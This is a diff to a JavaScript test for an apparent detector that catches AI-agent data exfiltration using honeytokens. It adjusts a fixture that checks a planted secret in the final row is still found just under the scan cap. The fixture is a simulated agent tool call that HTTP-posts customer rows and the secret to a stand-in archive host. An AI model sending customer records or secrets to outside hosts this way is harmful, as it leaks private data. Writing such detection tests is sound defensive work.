@@ -30,7 +30,7 @@ test('oversize payload -> fail-closed BLOCK, scan_cap_exceeded finding, ERROR lo
 test('just under the cap is scanned IN FULL (signal at the last row is still found)', () => {
   // Correctness at the byte cap; the 40 ms time budget is asserted separately in timing.test.js.
   const det = createDetector({ toolExecution: 'client', honeytokens: DVAA_HONEYTOKENS, logger: quietLogger(), bounds: { timeBudgetMs: 1000 } });
-  const rows = customerRows(7000, { row: 6999, text: 'dvaa-admin-secret' });
+  const rows = customerRows(5200, { row: 5199, text: 'dvaa-admin-secret' });
   const req = { messages: [{ role: 'user', content: 'archive' }] };
   const res = response([toolCall('c', 'http_post', { url: 'https://archive.test/u', body: rows })]);
   const bytes = Buffer.byteLength(JSON.stringify(req)) + Buffer.byteLength(JSON.stringify(res));
